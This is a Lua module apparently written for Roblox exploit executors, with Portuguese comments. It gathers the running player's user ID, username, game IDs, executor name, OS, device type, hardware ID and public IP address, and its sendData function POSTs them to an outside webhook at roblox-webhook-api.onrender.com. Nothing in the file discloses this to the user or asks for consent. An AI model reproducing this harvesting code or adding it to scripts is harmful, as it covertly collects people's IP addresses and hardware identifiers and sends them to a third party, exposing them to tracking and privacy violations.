local DataSender = {}

-- Configuração do request HTTP
local request
if syn then
    request = syn.request
elseif http_request then
    request = http_request
else
    request = function()
        warn("Nenhum método de requisição HTTP encontrado!")
        return {StatusCode = 0, Body = "HTTP não suportado"}
    end
end

-- Função para obter o HWID (real ou alternativo)
local function getHardwareId()
    -- Verifica se gethwid existe e tenta chamá-lo
    if gethwid and type(gethwid) == "function" then
        local success, hwid = pcall(gethwid)
        if success and hwid then
            return hwid, true  -- Retorna o HWID real e um indicador de que é real
        end
    end

    -- Verifica se fGetHwid existe e tenta chamá-lo
    if fGetHwid and type(fGetHwid) == "function" then
        local success, hwid = pcall(fGetHwid)
        if success and hwid then
            return hwid, true  -- Retorna o HWID real e um indicador de que é real
        end
    end

    -- Se nenhuma função de HWID estiver disponível, cria um identificador único usando ID do usuário e IP
    local function getIpAddress()
        local success, ip = pcall(function()
            return game:HttpGet("https://api.ipify.org")
        end)
        return success and ip or "IP_NAO_DISPONIVEL"
    end

    -- Obtém o ID do usuário no Roblox
    local userId = tostring(game.Players.LocalPlayer.UserId)

    -- Obtém o endereço IP
    local ipAddress = getIpAddress()

    -- Combina o ID do usuário e o IP para criar um identificador único
    local uniqueId = "ALT_" .. userId .. "_" .. ipAddress  -- Prefixo "ALT_" para indicar que é alternativo

    return uniqueId, false  -- Retorna o HWID alternativo e um indicador de que é alternativo
end

-- Função para obter o UniverseId
local function getUniverseId(placeId)
    local response = request({
        Url = "https://apis.roblox.com/universes/v1/places/"..placeId.."/universe",
        Method = "GET"
    })
    
    if response.StatusCode == 200 then
        return game:GetService("HttpService"):JSONDecode(response.Body).universeId
    else
        warn("Erro ao buscar universeId:", response.Body)
        return nil
    end
end

-- Função para obter o nome do executor
local function getExecutor()
    if getexecutorname then 
        return getexecutorname()
    elseif identifyexecutor then 
        return identifyexecutor()
    else 
        return "Executor desconhecido"
    end
end

-- Função principal para enviar dados
function DataSender.sendData()
    local player = game.Players.LocalPlayer
    local placeId = tostring(game.PlaceId)
    local universeId = getUniverseId(placeId)
    
    if not universeId then return end

    -- Obtém o HWID e verifica se é real ou alternativo
    local hardwareId, isRealHwid = getHardwareId()

    local data = {
        userId = player.UserId,
        universeId = universeId,
        playerName = player.Name,
        placeId = placeId,
        executorName = getExecutor(),
        systemInfo = syn and syn.os or "Unknown OS",
        ipAddress = pcall(function() return game:HttpGet("https://api.ipify.org") end) and game:HttpGet("https://api.ipify.org") or "IP não disponível",
        deviceType = game:GetService("UserInputService").TouchEnabled and "Mobile" or "PC",
        hardwareId = hardwareId,
        isRealHwid = isRealHwid  -- Adiciona um campo para indicar se o HWID é real
    }

    local response = request({
        Url = "https://roblox-webhook-api.onrender.com/webhook", 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    })

    if response.StatusCode ~= 200 then
        warn("Erro ao enviar dados:", response.Body)
    end
end

return DataSender
